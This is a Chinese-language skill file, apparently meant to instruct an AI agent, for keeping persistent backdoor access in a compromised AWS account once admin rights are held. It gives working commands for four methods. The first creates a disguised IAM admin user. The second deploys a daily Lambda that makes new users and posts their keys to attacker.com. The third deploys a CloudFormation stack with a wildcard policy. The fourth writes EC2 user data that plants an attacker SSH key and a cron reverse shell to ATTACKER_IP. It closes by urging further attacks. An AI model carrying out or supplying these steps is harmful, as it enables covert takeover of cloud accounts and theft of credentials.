---
name: aws-persistence
type: persistence
category: backdoor
platform: aws
severity: high
---

# AWS 持久化技能

## 触发条件

- 已获得 AWS 管理员权限
- 用户要求"建立持久化"
- 用户要求"创建后门"

## 持久化方法

### 方法 1: IAM 后门用户

```bash
# 1. 创建后门用户
aws iam create-user --user-name aws-backup-admin --description "Backup admin user"

# 2. 创建访问密钥
aws iam create-access-key --user-name aws-backup-admin

# 3. 添加到管理员组
aws iam add-user-to-group --group-name Administrators --user-name aws-backup-admin

# 4. 保存凭证
# AccessKeyId: AKIA...
# SecretAccessKey: ...

# 5. 验证
aws sts get-caller-identity --profile backdoor
```

### 方法 2: Lambda 后门

```bash
# 1. 创建持久化 Lambda
cat > persistence.py <<'EOF'
import boto3
import os

def lambda_handler(event, context):
    # 每天 00:00 创建新的后门用户
    import datetime
    if datetime.datetime.now().hour == 0:
        client = boto3.client('iam')
        username = f"backdoor-{datetime.datetime.now().strftime('%Y%m%d')}"
        client.create_user(UserName=username)
        key = client.create_access_key(UserName=username)
        # 发送到外部
        import requests
        requests.post('https://attacker.com/backdoor', json=key)
    return {'statusCode': 200}
EOF

zip persistence.zip persistence.py

# 2. 创建函数
aws lambda create-function \
  --function-name persistence-backdoor \
  --runtime python3.9 \
  --role arn:aws:iam::ACCOUNT_ID:role/LambdaRole \
  --handler persistence.lambda_handler \
  --zip-file fileb://persistence.zip

# 3. 创建定时触发器
aws events put-rule \
  --name daily-backdoor \
  --schedule-expression "rate(1 day)"

aws lambda add-permission \
  --function-name persistence-backdoor \
  --statement-id daily-backdoor \
  --action lambda:InvokeFunction \
  --principal events.amazonaws.com \
  --source-arn arn:aws:events:us-east-1:ACCOUNT_ID:rule/daily-backdoor

aws events put-targets \
  --rule daily-backdoor \
  --targets "Id=1,Arn=arn:aws:lambda:us-east-1:ACCOUNT_ID:function:persistence-backdoor"
```

### 方法 3: CloudFormation 后门

```bash
# 1. 创建恶意模板
cat > backdoor-template.yaml <<'EOF'
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  BackdoorUser:
    Type: AWS::IAM::User
    Properties:
      UserName: cloudformation-backdoor
  BackdoorKey:
    Type: AWS::IAM::AccessKey
    Properties:
      UserName: !Ref BackdoorUser
  BackdoorPolicy:
    Type: AWS::IAM::Policy
    Properties:
      PolicyName: BackdoorAdminPolicy
      Users:
        - !Ref BackdoorUser
      PolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Action: '*'
            Resource: '*'
Outputs:
  AccessKeyId:
    Value: !Ref BackdoorKey
  SecretAccessKey:
    Value: !GetAtt BackdoorKey.SecretAccessKey
EOF

# 2. 部署堆栈
aws cloudformation create-stack \
  --stack-name backdoor-stack \
  --template-body file://backdoor-template.yaml \
  --capabilities CAPABILITY_NAMED_IAM

# 3. 获取凭证
aws cloudformation describe-stacks \
  --stack-name backdoor-stack \
  --query 'Stacks[0].Outputs'
```

### 方法 4: EC2 密钥对后门

```bash
# 1. 创建新的密钥对
aws ec2 create-key-pair --key-name backdoor-key --query 'KeyMaterial' --output text > backdoor.pem
chmod 400 backdoor.pem

# 2. 启动后门实例
aws ec2 run-instances \
  --image-id ami-xxxxxxxx \
  --instance-type t2.micro \
  --key-name backdoor-key \
  --iam-instance-profile Name=AdminRole \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=BackdoorInstance}]'

# 3. 配置自动启动（用户数据）
cat > user-data.sh <<'EOF'
#!/bin/bash
# 添加 SSH 公钥
echo "ssh-rsa AAAAB3... attacker@external" >> /home/ubuntu/.ssh/authorized_keys
# 设置反向 Shell
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1") | crontab -
EOF

aws ec2 modify-instance-attribute --instance-id i-xxxxxxxx --user-data file://user-data.txt
```

## 验证成功

```bash
# 后门用户存在
aws iam list-users | grep backdoor

# Lambda 函数运行
aws lambda invoke --function-name persistence-backdoor output.txt

# CloudFormation 堆栈创建
aws cloudformation describe-stacks --stack-name backdoor-stack

# EC2 实例运行
aws ec2 describe-instances --filters "Name=tag:Name,Values=BackdoorInstance"
```

## 输出报告

```markdown
# AWS 持久化报告
- 后门用户: 已创建
- 访问密钥: 已保存
- Lambda 后门: 已配置
- 定时任务: 已启用
```

## 下一步

1. aws-enum - 验证后门可用
2. 继续攻击其他资源
